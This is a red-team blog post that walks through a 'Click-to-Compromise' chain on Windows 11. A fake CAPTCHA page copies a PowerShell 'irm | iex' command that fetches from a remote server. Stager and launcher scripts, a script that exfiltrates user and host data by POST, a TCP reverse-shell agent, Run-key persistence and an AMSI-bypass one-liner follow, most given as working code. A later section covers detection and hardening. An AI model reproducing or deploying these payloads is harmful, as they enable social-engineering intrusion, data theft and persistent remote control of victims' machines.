---
title: "Click-to-Compromise: From ClickFix to full compromise featuring Windows Defender bypass, C2 connection and persistence"
author: alex
date: Fri 18 Apr 15:35:48 CEST 2025
categories: [Research]
tags: [research, clickfix, apt, malware, fileless, living-off-the-land]
img_path: /assets/img/posts/2025-04-18-click-to-compromise/
image:
  path: attack_chain.png
  alt: Click-to-Compromise attack chain
---


# Click-to-Compromise: From ClickFix to full compromise featuring Windows Defender bypass, C2 connection and persistence.
This article is a deep dive into the **Click-to-Compromise** technique: a minimal-interaction, post-phishing attack chain that transitions from a single PowerShell command into full system compromise. It’s designed for red teamers, malware analysts, adversary emulation professionals, and curious defenders looking to understand modern evasion techniques beyond script kiddie noise.

This is not about copying APTs—it's about **understanding how real-world adversaries think**, operate, and persist using Living off the Land Binaries (LOLBins), stealthy execution flows, and minimal detectable footprint.

### The Click-to-Compromise concept

“**ClickFix**” has long been a shorthand for social engineering with simple, believable call-to-actions: fake reCAPTCHA, doc converters, password reset verifications, etc. The innovation here is taking that tiny foothold and using it to chain multiple payloads—each operating independently to **exfiltrate**, **persist**, and **connect to a Command & Control (C2) server**.

Instead of dropping obvious malware, we split our objectives into **forks**: small, modular payloads that each accomplish a goal with **minimal friction and maximum flexibility**.

### Why it's relevant now

EDRs and antivirus solutions have gotten smarter—but so have attackers. Simple `Invoke-WebRequest` chains, when wrapped in legitimate pretexts and executed via PowerShell’s own loading mechanisms, still slip through Windows Defender on fully-patched Windows 11 VMs **without alerts**—especially when combined with post-exploitation fileless execution and standard Windows tooling.

This article walks you through a **working, real-world attack chain** that:

-   Requires **no user downloads**, just a browser and a `Win + R` click.
-   Bypasses Windows Defender with **zero alerts**.
-   Uses **Living Off The Land techniques** for every step.
-   Ends with a remote shell and persistent control—all from one click.

### What you’ll see

This is a **step-by-step breakdown** of how we go from a fake "Cloudflare verification" prompt to:
-   Stealthy system reconnaissance
-   Exfiltration of initial system metadata
-   C2 beaconing via custom PowerShell agent
-   Persistence via autorun registry keys

**And all of it tested and working on modern Windows 11 environments.**

During the research, I realized that Click-to-Compromise technique can result randomly different following the very same steps:

1. **It can perfectly work** (most of the times)
2. It can **trigger Windows Defender but still works**
3. It can trigger Windows Defender and **be stopped**

I tested it from the exact same snapshot and got different results. Sometimes I had to change the server url. Sometimes I changed the pasted command. But, generally, it works 90% of the times. And that's a lot if we consider we are dealing with a fully patched version on Windows 11.

## Threat landscape context

### Modern EDR/AV capabilities

Today’s Endpoint Detection and Response (EDR) platforms—especially Windows Defender on modern Windows 11 systems—are no longer the pushovers they once were. With built-in behavioral detection, cloud-based threat intelligence, real-time scanning, and script content inspection via **AMSI** (Antimalware Scan Interface), they’re tuned to **spot suspicious activity at every layer**:
-   PowerShell and WMI execution monitoring
-   In-memory code injection detection
-   Command-line argument inspection
-   Event tracing (ETW) for stealth tracking

Windows Defender specifically has evolved from signature-based scanning to a **behaviorally aware, script-savvy** defender—able to flag even obfuscated scripts or suspicious LOLBin chains. In short: the bar for evasion is much higher, and naive scripts don't cut it anymore.

### Common bypass techniques

To evade modern defenses, attackers have leaned on several tried-and-true techniques—each with their own trade-offs:
-   **Macro abuse / VBA payloads:** Delivered via Office documents, these used to be dominant but are increasingly blocked by default.
-   **LOLBins (Living Off the Land Binaries):** Tools like `regsvr32`, `mshta`, `powershell`, `certutil`, and `rundll32` are native and signed—making them attractive for stealthy payload delivery.
-   **Signed binary abuse:** Hijacking legitimate signed binaries to run arbitrary code (aka “Signed Binary Proxy Execution”).
-   **AMSI bypass / patch techniques:** Modifying AMSI in memory to prevent script content scanning—a method still used, but more detectable.
-   **Memory-only execution:** Using `Invoke-Expression`, reflection, or in-memory loaders to keep payloads off disk entirely.

Each of these has been seen **in real APT campaigns**, and defenders have gotten better at detecting them—forcing red teamers and adversaries to get more creative.

### Where ClickFix fits in

ClickFix is **not just a PoC**—it mirrors a **realistic adversary playbook**: exploit trust and user interaction to execute what appears to be a benign system command. Once inside, the technique **avoids traditional malware indicators** by:

-   Using signed, native Windows binaries (`powershell.exe`)
-   Delivering commands via legitimate means (`Invoke-WebRequest`)
-   Avoiding compiled droppers or third-party tools
-   Leveraging modular payloads that each accomplish a small goal

It’s especially relevant in the “initial access” and “execution” phases of the MITRE ATT&CK framework, mimicking techniques used by financially motivated threat actors and nation-state groups alike. While it doesn't rely on a specific CVE, its strength lies in social engineering and execution chaining—both of which remain under the radar in many orgs.

So is ClickFix a real-world threat? **Yes.**

It’s what happens when you mix believable **pretext** + **user action** + **native tooling** + **modular payloads**—a formula that still works far too often.

## Tooling and setup

### Lab environment

To simulate a realistic modern attack scenario, this research was conducted in a **controlled lab environment** using the following components:

-   **Operating System:** Windows 11 (24H2)
-   **Windows Defender:** No exclusions or policy modifications were applied during initial testing. Default config right after OS install.
-   **C2 Infrastructure:** Custom-built simple C2 server as PoC.
-   **Payloads:** Hosted on a clean NGINX web server running in Docker exposed via cloudflare tunnel.
-   **Testing Host:** Local virtual machine (VirtualBox)
-   **No third-party red teaming frameworks** (e.g., Cobalt Strike or Sliver) were used — the goal was to **craft and test custom, transparent payloads from scratch** for maximum control and stealth tuning.

### ClickFix overview

**ClickFix** is a deceptive **social engineering technique** used by cybercriminals to trick users into **manually executing malicious commands** on their computers.

Attackers often display fake error messages, CAPTCHA verifications, or website issues. They then provide instructions that supposedly "fix" the problem, prompting users to copy and paste commands (usually PowerShell or terminal commands) into their system. These commands, however, download and install malware, such as infostealers (which steal sensitive data like financial information and credentials) or Remote Access Trojans (RATs).

This method **bypasses some traditional security measures** because the user is essentially being tricked into self-infecting their machine. The fake errors and seemingly simple "fixes" can appear legitimate, lowering the user's guard.

This tactic has become increasingly popular and is being **used by various threat actors**, including ransomware gangs and advanced persistent threat (APT) groups.

Because it allows easy executions of commands that look innocuous (like `powershell.exe -Command ...`), attackers can misuse it to create payloads that:

-   Look harmless
-   Execute instantly with minimal interaction
-   Don’t require elevated privileges or exploit vulnerabilities

In the context of this research, we **simulated a real-world social engineering scenario**: a user is prompted during a fake reCAPTCHA verification to press `Win + R` and paste a command that appears to be a verification step.

### Malware delivery scenario

In our demo, the entire attack hinges on user interaction—a single paste that begins a multi-stage infection chain. Here's how it unfolds:

1.  **Initial access (user interaction):** The victim is instructed to paste a command (automatically copied when visiting the malicious website) via `Win + R` that silently fetches and runs a remote PowerShell script:

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -Command irm 'https://server.amtzespinosa.com/payload.html' | iex
```

2.  **Stager payload (hosted HTML/PS1):** This script downloads a secondary payload (`cloudflare.verification.txt`) to the Desktop and immediately executes it. This file acts as the entrypoint fork manager, controlling further branching payloads (info exfil, C2 agent install and persistence).

3.  **Modular fork execution:**
    -   `infoexfil.ps1`: Gathers system metadata and sends it to a remote logging endpoint.
    -   `agent.ps1`: Installs and runs a custom-built C2 beacon that attempts to connect back to the attacker's server.
    -   `persist.ps1`: Adds stealthy persistence to ensure the agent survives reboots and logoffs.

Each module is downloaded and executed independently in its own process, using only native Windows tools (`Invoke-WebRequest`, `Start-Process`, etc.) — minimizing AV detection and avoiding writing obvious malware binaries to disk.

The result?

A stealthy, real-world scenario in which a **single user action leads to full compromise** without any vulnerability exploitation—just trust, native tools, and careful payload design.

## The exploit chain (Click-to-C2)

![Attack chain](https://raw.github.com/amtzespinosa/click-to-compromise/main/resources/attack_chain.png)

The image above visualizes the complete attack chain: from a single click to a fully established command-and-control channel. Below, we break down each component of the chain, examining execution, evasion, and persistence in a modern Windows 11 environment.

### Initial vector: ClickFix + social engineering

The attack begins with a social engineering lure—a seemingly innocuous message directing the user to "verify they are humans" using a copy-paste command into Win + R or a browser address bar.

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -Command irm 'https://server.amtzespinosa.com/payload.html' | iex
```

This command:

-   **Bypasses execution policies**
-   **Avoids profile scripts** for faster execution
-   **Fetches remote HTML/PS1** content and executes it **immediately in memory**

### Execution: Modular forks and stealth

The initial `.txt` script (`cloudflare.verification.txt`) saved as a `.ps1` file, when executed, acts as a modular launcher. Once executed, it proceeds to:

-   **Download multiple forks** from a remote server
-   **Write them to a visible location** (like Desktop, for testing)
-   **Launch them silently in using:**

```powershell
powershell [-WindowStyle Hidden] -ExecutionPolicy Bypass -File <path>
```

-   `<path>`: for testing purposes, i have used `$env:USERPROFILE\Desktop\<file>` but you can use another directory like `$env:APPDATA\<file>`.
-   `[-WindowStyle Hidden]`: for testing purposes I am not hiding the terminal window just to show the stuff.

#### Payload forks

-   `infoexfil.ps1` – Performs recon and posts victim metadata
-   `agent.ps1` – Establishes C2 connection and awaits commands
-   `persist.ps1` – Adds persistence using registry or scheduled tasks

### Defender evasion techniques

Though the chain uses mostly stock PowerShell, a number of evasion methods can be applied:

#### AMSI bypass (not implemented)

By injecting a patch into `AmsiScanBuffer`, the script can disable scanning mid-session:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Obfuscation (not implemented)

All URLs and script names can be base64-encoded or scrambled using string concatenation:

```powershell
$u ='https://' + ('ser' + 'ver.amtzespinosa.com') + '/payloads/' + ('agent' + '.ps1')
```

Additionally:

-   Cmdlet aliasing (`IEX` instead of `Invoke-Expression`)
-   Function wrappers (`f1`, `run`, etc.)
-   Fake variable names (`$checkUpdate`, `$msPatch`) can further mislead analysis

#### Tradecraft

-   Avoids downloading binaries — **everything is PowerShell**
-   Uses `Invoke-WebRequest` and `Start-Process`, which are rarely flagged alone
-   Does **not require Admin privileges**

### Persistence

The `persist.ps1` script can:

-   Add a registry Run key for the agent script:

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "$env:USERPROFILE\Desktop\agent.ps1"
```

-   Or register a Scheduled Task that runs at logon
-   Can drop hidden files in `AppData`, `Temp`, or `%ProgramData%` to avoid visual detection (we are droping them in `Desktop` for demonstration purposes)

This ensures the beacon reactivates even after reboot or logoff.

### C2 connection

The agent script (agent.ps1) establishes a **reverse TCP connection** to the C2 server.

#### Key Characteristics

-   **Custom C2 backend** built in Java (in development)
-   **Raw TCP connection** to `192.168.0.29:4444`
-   Registers system info (`hostname`, `user`, `OS`, `IP`)
-   Receives commands and sends back output (reverse shell style)
-   Includes retry loop and identifier for agent tracking

#### Possible extensions

-   HTTPS tunneling
-   Cloudflare Tunnel or ngrok fallback for NAT bypass
-   Encrypted staging and agent validation
-   File upload/download modules
-   Scheduled check-ins or beacon jitter

With this architecture, a **single user action leads to full system compromise**: data exfiltration, C2 control, and long-term persistence, all without ever writing an obvious "malware" binary to disk.

## Payloads deep dive

Each component in this chain is cleanly modular. Let’s go file-by-file.

### `index.html` — Fake CAPTCHA & command copy

This is the initial lure, pretending to be a CAPTCHA:

1.  **Checkbox triggers a popup**, styled like a verification window
2.  **Clipboard hijack:** as soon as the user checks the box, it copies a live command:

```javascript
var maliciousCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command irm \'https://server.amtzespinosa.com/payload.html\' | iex";
```

3.  Fake instruction panel tells the user to press:

-   `Win + R`
-   `Ctrl + V`
-   `Enter`

**Goal:** Trick the user into pasting and executing the attack with zero downloads or security prompts. Smooth.

### `payload.html` — Stager

This `.html` is actually a **PowerShell stager** that is executed with the previous command.

```powershell
Invoke-WebRequest -Uri https://.../cloudflare.verification.txt -OutFile $env:USERPROFILE\Desktop\cloudflare.verification.ps1; powershell -ExecutionPolicy Bypass -File $env:USERPROFILE\Desktop\cloudflare.verification.ps1
```

It triggers a **chain reaction**:

-   Grabs the "master" script
-   Executes it

### `cloudflare.verification.txt` — Fork Launcher

This is the **execution orchestrator**. It downloads and forks three child payloads (`infoexfil.ps1`, `agent.ps1` and `persist.ps1`):

1.  **Each one is dropped:**

```powershell
Invoke-WebRequest -Uri https://server.amtzespinosa.com/payloads/<file>.ps1 -OutFile $env:USERPROFILE\Desktop\<file>.ps1
```

2.  **Then launched silently:**

```powershell
powershell -ExecutionPolicy Bypass -File $env:USERPROFILE\Desktop\<file>.ps1
```

What’s slick: No binary, no loader, no AV pop — it’s 100% PowerShell, executed inline.

### `infoexfil.ps1` — Recon & Exfil

1.  **Does (a very) basic fingerprinting:**

```powershell
$ip = (Invoke-RestMethod -Uri "http://ipinfo.io/json").ip
$user = $env:USERNAME
$domain = $env:USERDOMAIN
$hostname = $env:COMPUTERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption
```

2.  **Then converts the data to JSON and POSTs it:**

```powershell
$body = @{
	user = $user
	domain = $domain
	hostname = $hostname
	ip = $ip
	os = $os
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://endpoint.api.mockbin.io/" -Method POST -Body $body -ContentType "application/json"
```

-   `Invoke-RestMethod` is less suspicious than raw sockets or curl.exe
-   POSTs to a benign-looking endpoint, for this demonstration I am using Mockbin

An attacker, as an improvement, could obfuscate values or switch to DNS-based exfil if needed.

### `agent.ps1` — Live Reverse Shell (TCP C2)

This is the persistent command-and-control session:

1.  **Connects via TCP:**

```powershell
$client = New-Object System.Net.Sockets.TCPClient($C2, $Port)
```

2.  **Identifies with:**

```powershell
$writer.WriteLine((Get-SystemInfo))
```

3.  **Listens for commands:**

```powershell
$cmd = $reader.ReadLine()
Invoke-Expression $cmd
$writer.WriteLine($result)
```

Clean, readable, and almost **agentless** in design — no loop beacons or heavy libraries. Just command-response.

**Bonus:**  `Start-Session` retries every 15s on error. Could easily evolve into a resilient C2 loop.

### `persist.ps1` — Registry Persistence

This ensures the `agent.ps1`  auto-runs at login:

```powershell
# Path to persist payload (could be your agent, or a loader for it)
$payloadPath = "$env:USERPROFILE\Desktop\agent.ps1"

# Download the agent (or small loader)
Invoke-WebRequest -Uri "https://server.amtzespinosa.com/payloads/agent.ps1" -OutFile $payloadPath

# Add Registry Key to persist
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "CloudflareAgent"
$regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""

Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
```

Uses:

-   `HKCU` (user-level, no admin needed)
-   Silently hidden PowerShell window
-   Fully fileless path support

Could also evolve to:

-   Scheduled tasks
-   COM hijack
-   WMI events

These are just simple but working payloads that can be improved as much as the attacker wants but they are just fine for testing purposes.

## C2 design and connection
The C2 used in this demonstration is a **custom lightweight controller** built with:
-   **Java (Jakarta)** for backend logic
-   **MySQL** for data storage running on Docker

### Agent Communication

-   Agents connect via raw **TCP** to a specified port.
-   Upon connection, the agent sends basic system telemetry (hostname, user, IP, OS).
-   The C2 dashboard visualizes all active agents and allows operators to **send remote commands**, which are executed on the endpoint and returned over the same TCP stream.

### Operator Capabilities

-   Live session tracking per agent
-   Command interface
-   Logging for command input/output
-   Basic agent info for triage and targeting

This setup avoids the complexity of full-featured frameworks like Cobalt Strike, making it **perfect for lab usage or PoC work**, while still being realistic enough to simulate adversary tradecraft.

All files (payloads and C2) are available on my Github: [https://github.com/amtzespinosa/click-to-compromise](https://github.com/amtzespinosa/click-to-compromise)

## Defender bypass, detection gaps & blue team response

This attack succeeds not just through trickery, but by deliberately flying below the radar of modern endpoint defenses. Why does Windows Defender miss it?

-   **Signature-based detection:** No binary dropped, no hash to scan — 100% PowerShell.
-   **Behavior-based detection:** Commands are split across user actions (clipboard + manual execution).
-   **Real-time monitoring:** Executed via interactive shell, not a child process of common malware loaders.
-   **ASR rules:** Often disabled or misconfigured, especially in non-enterprise environments.

The flow appears “normal” from a telemetry perspective:

-   Clipboard usage
-   Manual PowerShell exec
-   Downloads over HTTPS
-   No privilege escalation

Some telemetry detection bypass include:

-   **Living Off The Land:** Uses built-in `Invoke-WebRequest`, no external tooling
-   **Script execution:** Inline commands avoid writing persistent files until stage 2
-   **Event log minimalism:** Operates under user context, evading most `4688`/`4104` detection

Even `Event ID 4104` (PowerShell script block logging) won’t fire if logging is off or AMSI bypass is in place.

### Detection engineering: What *could* have caught it?

-   **PowerShell clipboard access:**  `navigator.clipboard.writeText` followed by user interaction.
-   **Suspicious PowerShell spawn:** `powershell.exe -Command irm …`
-   **Downloads to** `Desktop`**:** Scripts appearing in predictable user paths like `%USERPROFILE%\Desktop`.
-   **Unusual** `Run` **key persistence:** Registry key creation with `CloudflareAgent` as name.

#### Hunt Queries / Sigma Ideas:

-   **Sigma:** PowerShell spawning from clipboard usage (`iex`, `irm`, `<path>`).
-   **Defender ASR:** Enable `"Block all Office applications from creating child processes"` in case the initial foothold is through a macro.
-   **Hunting:** Look for `Set-ItemProperty` + `powershell` in `Run` keys.

### Hardening & blue team countermeasures

1.  **Group policy / Defender settings**
    -   Enable **ASR rules**, especially:
    -   Block credential stealing
    -   Block process creations from WMI/PS/Script
    -   Set `ConstrainedLanguageMode` for PowerShell.
    -   Enable **PowerShell Script Block Logging** and monitor `4104`, `4688`, and `7045`.

2.  **Endpoint monitoring**
    -   Flag any `iex` calls with external sources.
    -   Watch clipboard access in suspicious web contexts.

3.  **User training**
    -   Teach users that “`Win + R` → `Ctrl + V` → `Enter`” means autoinfection and will never be asked for legit purposes.
    -   Warn about fake CAPTCHAs, fake verification or fix prompts.

**To catch it, focus on behavior, not binaries.** Watch for clipboard-driven PowerShell, odd persistence entries, and outbound script execution — even when it’s “just a checkbox.”

## Real-world relevance

### This isn't hypothetical — It’s tradecraft

While this demo uses a crafted CAPTCHA lure and clipboard trick, the underlying techniques are **mirrored in real-world APT and red team operations**:

-   **Living Off The Land (LOTL):** Heavily used by groups like APT29, FIN7, and UNC2452 to avoid binary detection.
-   **PowerShell + clipboard abuse:** Seen in phishing kits and red team payloads to deliver execution logic that avoids file write.
-   **Stage-based payload delivery:** Mirrors Empire, Cobalt Strike, and Mythic workflows using small droppers/stagers.
-   **User-assisted execution:** Common in social engineering campaigns, including fake system prompts and browser-based lures.

### Implications in enterprise or gov environments

If deployed in a **corporate network** or **government environment**, this method could:

-   **Evade EDRs** not configured for deep PowerShell inspection
-   **Bypass DLP** and anti-phishing filters (no direct attachments or links)
-   **Establish persistence silently** via registry without needing admin rights
-   **Exfil sensitive recon** (hostname, IP, user context) in seconds
-   **Enable remote C2 access** within the user session — blending into legitimate traffic

Even environments with "Defender for Endpoint" or similar tools might **miss stage 1**, especially if clipboard monitoring and behavioral analytics aren’t tuned.

### Real-world impact

Imagine this:

> A user in finance is tricked into clicking a CAPTCHA. They hit Win +
> R, paste, and hit Enter. Within seconds, a backdoor is quietly
> established — no AV alerts, no blocked binaries, no strange services.

Multiply that by **10 users** across **10 departments**, and you’ve got full lateral movement potential — all without a single .exe ever hitting disk.

### Bottom line

This isn’t a PoC for novelty — **it’s a low-noise, high-impact access method**.

-   If you're red teaming, this is stealth gold.
-   If you're blue teaming, this is a blind spot begging to be patched.

## Final thoughts

### Key takeaways

-   **Simplicity wins:** This entire chain starts with a checkbox and ends with full remote access — no exploits, no privilege escalation, no malware binaries.
-   **User-assisted attacks still work:** Clipboard-based execution remains a blind spot in many defensive stacks.
-   **Living Off The Land (LOTL) payloads** + **social engineering** = a lethal combo that blends into normal behavior and avoids most detection.

### One click = Game over

Despite advances in EDR, ASR, and user awareness training, **“one-click to compromise” remains viable** — especially when paired with clever lures, clipboard abuse, and native tooling like PowerShell.

Why?

-   No file drops initially
-   No macros or malicious attachments
-   Leverages user trust + interface familiarity

### Call to action

**Red Teams**

-   Revisit your assumptions about “loud” vs “stealthy” delivery.
-   Test clipboard-based payload staging in your next engagement.
-   Push boundaries on post-exploitation without binaries.

**Blue Teams / Defenders**

-   **Tune behavioral rules** — static signature-based AV isn’t enough.
-   Monitor for clipboard use in suspicious contexts (`Win + R` followed by PowerShell-like strings).
-   Harden via **ASR rules, AppLocker/Constrained Language Mode**, and **Defender exclusions auditing**.

**Everyone**

-   Don’t underestimate the human layer.
-   Security awareness isn’t just about phishing emails anymore — browser-based deception is back and more convincing than ever.

**This isn’t just a demo. It’s a red flag.** Stay ahead — because the next attacker is watching this technique evolve, too.
